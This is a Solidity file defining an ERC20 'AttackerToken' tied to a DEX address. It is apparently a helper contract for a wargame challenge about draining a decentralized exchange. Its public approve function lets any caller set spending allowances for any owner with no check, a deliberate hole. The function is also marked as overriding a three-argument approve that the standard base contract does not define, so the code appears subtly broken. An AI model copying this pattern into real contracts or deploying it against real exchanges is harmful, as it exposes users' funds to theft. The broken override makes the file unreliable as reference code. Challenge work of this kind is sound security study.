pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract AttackerToken is ERC20 {
    address private _dex;

    constructor(address dex, string memory name, string memory symbol, uint256 initialSupply) 
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dex;
    }

    function approve(address owner, address spender, uint256 amount) public override {
        super._approve(owner, spender, amount);
    }
}
